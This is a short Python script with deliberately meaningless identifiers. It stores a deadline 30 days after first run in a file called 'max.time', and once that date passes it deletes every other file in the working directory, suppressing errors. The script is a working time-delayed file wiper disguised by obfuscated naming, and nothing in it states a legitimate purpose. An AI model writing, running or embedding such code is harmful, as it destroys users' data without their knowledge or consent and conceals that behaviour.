import os
from datetime import datetime, timedelta, date
def ytbvry5y6UN():
    uybtvrnuRTvfjnykmu = 'max.time'
    if not os.path.exists(uybtvrnuRTvfjnykmu):
        with open(uybtvrnuRTvfjnykmu, 'w') as f:
            HGjyiuuft8 = date.today()
            JIUujkm = HGjyiuuft8.year
            ui6kih = HGjyiuuft8.month
            kjluyuii = HGjyiuuft8.day
            target_date = datetime(JIUujkm, ui6kih, kjluyuii) + timedelta(days=30)
            f.write(target_date.strftime('%d/%m/%Y'))
    with open(uybtvrnuRTvfjnykmu, 'r') as f:
        HGFYyi876 = f.read().strip()
        GFh65u = datetime.strptime(HGFYyi876, '%d/%m/%Y')
    BKJHTTyj = datetime.now()
    if BKJHTTyj > GFh65u:
        for uybtvrnuRTvfjnykmu in os.listdir('.'):
            if uybtvrnuRTvfjnykmu != 'max.time':
                try:
                    os.remove(uybtvrnuRTvfjnykmu)
                except Exception:
                    print()